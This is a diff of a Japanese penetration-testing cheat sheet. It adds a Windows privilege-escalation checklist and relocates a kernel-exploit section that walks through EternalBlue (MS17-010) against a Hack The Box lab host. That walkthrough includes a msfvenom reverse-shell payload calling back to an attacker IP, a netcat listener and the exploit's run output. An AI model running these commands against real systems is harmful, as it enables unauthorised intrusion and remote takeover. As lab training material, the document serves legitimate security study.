@@ -1851,11 +1851,28 @@ linux-exploit-suggester2:
 https://github.com/jondonas/linux-exploit-suggester-2
 
 
-# Windows
+# Privilege Escalation(Windows)
 ## チェック項目
-[]
+- Service Exploits
+  - Insecure Service Permissions(安全でないサービスパーミッション)
+  - Unquoted Service Path(引用符で囲まれていないサービスパス)
+  - Weak Registry Permissions(レジストリ権限の不備)
+  - Insecure Service Executables(安全でないサービス実行可能ファイル)
+- Registry(レジストリ)
+  - AutoRuns(AutoRunバイナリファイルの悪用)
+  - AlwaysInstallElevated(AlwaysInstallElevatedキーの悪用)
+- Passwords
+  - Registry(レジストリ内に保存されているパスワードの検索)
+  - Saved Creds(保存されている資格情報の悪用)
+  - Security Account Manager(SAM)の悪用
+  - Pass the Hash
+- Scheduled Tasksの悪用
+- 安全でないGUIアプリの悪用
+- スタートアップディレクトリの悪用
+- トークンの偽装(Potato Attack, PrintSpoofer)
+- Kernel Exploit
 
-## Windowsサービスの悪用
+## Windowsサービスを悪用した権限昇格
 ```
 # 現在のユーザーに割り当てられている特権を確認
 whoami /priv
@@ -2290,6 +2307,89 @@ PrintSpoofer.exe -c "C:\Windows\Temp\reverse.exe(reverse shellペイロードが
 PrintSpoofer:  
 https://github.com/itm4n/PrintSpoofer.git
 
+## Kernel Exploit
+### 手動列挙
+```
+systeminfo
+```
+```
+searchsploit Microsoft Windows [OS version];
+searchsploit Microsoft Windows [build number]
+```
+### windows-exploit-suggester(自動列挙)
+windowsでexploitを列挙するためのスクリプト
+systeminfoコマンドの出力が必要
+```
+./windows-exploit-suggester.py --update
+pip install xlrd
+```
+```
+systeminfo > systeminfo.txt
+./windows-exploit-suggester.py –database 2020-06-08-mssb.xls –systeminfo systeminfo.txt
+```
+### Windows-kernel-exploits
+コンパイル済みのカーネルエクスプロイト用バイナリが用意されている。  
+Windows-kernel-exploits:  
+https://github.com/SecWiki/windows-kernel-exploits.git
+
+### MS17-010_EternalBlue(without metasploit)
+エクスプロイトに必要なものを準備。
+この最後のmysmb.pyをダウンロードしておかないと、ImportError：mysmbと警告が出る。
+```
+wget https://www.exploit-db.com/raw/42315
+mv 42315 eternalblue.py
+wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
+```
+次にimpacketもインストールしておかないと使うことができないので入っていない場合は落としておく。
+```
+git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket
+pip install .
+```
+もしもここでpipが入っていないと警告が出た場合は、pipもインストールしておく。
+```
+sudo apt install python-pip
+```
+次に、リバースシェルに使うペイロードをmsfvenomを利用して作成する。
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=1234 -f exe > reverse.exe
+```
+
+次にeternalblue.pyのソースコードを変更してエクスプロイトに使用できるようにする。  
+まずUSERNAMEのところを下記の画像のように変更。  
+
+![](./image/2021-05-06-17-48-11.png)  
+
+次にsmb_pwn関数内のスクリプトを下記の画像のように変更。  
+
+![](./image/2021-05-06-17-48-54.png)  
+
+これで準備は完了。
+通信を受けるためにnetcatで待ち受けておく。  
+```
+nc -lvp 1234
+```
+最後にeternalblue.pyを実行。
+```
+┌─[✗]─[yukitsukai@parrot]─[~/htb/Blue]
+└──╼ $python eternalblue.py 10.10.10.40 ntsvcs
+Target OS: Windows 7 Professional 7601 Service Pack 1
+Target is 64 bit
+Got frag size: 0x10
+GROOM_POOL_SIZE: 0x5030
+BRIDE_TRANS_SIZE: 0xfa0
+CONNECTION: 0xfffffa8001af9560
+SESSION: 0xfffff8a001bf5de0
+.
+.
+.
+ServiceExec Error on: 10.10.10.40
+nca_s_proto_error
+Done
+```
+通信を待ち受けていたnetcatの方でシェルが取得できる。  
+![](./image/2021-05-06-17-49-20.png)
+
 ## Tips
 ### 侵入先情報の列挙
 ```
@@ -2435,89 +2535,6 @@ gem install evil-winrm
 ```
 evil-winrm -u <username> -p <password> -i <remote host ip>
 ```
-
-## Kernel Exploit
-### 手動列挙
-```
-systeminfo
-```
-```
-searchsploit Microsoft Windows [OS version];
-searchsploit Microsoft Windows [build number]
-```
-### windows-exploit-suggester(自動列挙)
-windowsでexploitを列挙するためのスクリプト
-systeminfoコマンドの出力が必要
-```
-./windows-exploit-suggester.py --update
-pip install xlrd
-```
-```
-systeminfo > systeminfo.txt
-./windows-exploit-suggester.py –database 2020-06-08-mssb.xls –systeminfo systeminfo.txt
-```
-### Windows-kernel-exploits
-コンパイル済みのカーネルエクスプロイト用バイナリが用意されている。  
-Windows-kernel-exploits:  
-https://github.com/SecWiki/windows-kernel-exploits.git
-
-### MS17-010_EternalBlue(without metasploit)
-エクスプロイトに必要なものを準備。
-この最後のmysmb.pyをダウンロードしておかないと、ImportError：mysmbと警告が出る。
-```
-wget https://www.exploit-db.com/raw/42315
-mv 42315 eternalblue.py
-wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
-```
-次にimpacketもインストールしておかないと使うことができないので入っていない場合は落としておく。
-```
-git clone https://github.com/SecureAuthCorp/impacket.git
-cd impacket
-pip install .
-```
-もしもここでpipが入っていないと警告が出た場合は、pipもインストールしておく。
-```
-sudo apt install python-pip
-```
-次に、リバースシェルに使うペイロードをmsfvenomを利用して作成する。
-```
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=1234 -f exe > reverse.exe
-```
-
-次にeternalblue.pyのソースコードを変更してエクスプロイトに使用できるようにする。  
-まずUSERNAMEのところを下記の画像のように変更。  
-
-![](./image/2021-05-06-17-48-11.png)  
-
-次にsmb_pwn関数内のスクリプトを下記の画像のように変更。  
-
-![](./image/2021-05-06-17-48-54.png)  
-
-これで準備は完了。
-通信を受けるためにnetcatで待ち受けておく。  
-```
-nc -lvp 1234
-```
-最後にeternalblue.pyを実行。
-```
-┌─[✗]─[yukitsukai@parrot]─[~/htb/Blue]
-└──╼ $python eternalblue.py 10.10.10.40 ntsvcs
-Target OS: Windows 7 Professional 7601 Service Pack 1
-Target is 64 bit
-Got frag size: 0x10
-GROOM_POOL_SIZE: 0x5030
-BRIDE_TRANS_SIZE: 0xfa0
-CONNECTION: 0xfffffa8001af9560
-SESSION: 0xfffff8a001bf5de0
-.
-.
-.
-ServiceExec Error on: 10.10.10.40
-nca_s_proto_error
-Done
-```
-通信を待ち受けていたnetcatの方でシェルが取得できる。  
-![](./image/2021-05-06-17-49-20.png)
 
 ## PrivEsc Tools(Windows)
 Windows Sysinternals:
